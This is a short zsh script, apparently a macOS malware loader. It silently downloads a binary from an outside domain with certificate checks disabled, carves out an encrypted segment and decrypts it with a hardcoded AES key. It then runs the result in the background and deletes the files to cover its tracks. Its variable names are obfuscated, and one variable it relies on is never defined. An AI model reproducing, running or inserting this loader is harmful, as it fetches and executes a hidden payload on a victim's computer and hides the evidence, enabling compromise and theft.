#!/bin/zsh
y9au9=$(mktemp /tmp/vbn7h7.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mf524ffa2440cd830.bin" -o "$y9au9z" || exit 1
r8nap3=$(stat -f %z "$y9au9z"); a2tvb2d=$(( r8nap3 - 3281 - 2471 ))
tail -c +$(( 3281 + 1 )) "$y9au9z" | head -c $a2tvb2d | openssl enc -d -aes-256-cbc -k 68e85a5b28a1e65aed8e66c1 -out "$y9au9" 2>/dev/null
[ -s "$y9au9" ] && chmod 700 "$y9au9" && ( "$y9au9" & ) && disown
( sleep 3; rm -f "$y9au9" "$y9au9z" ) &>/dev/null &
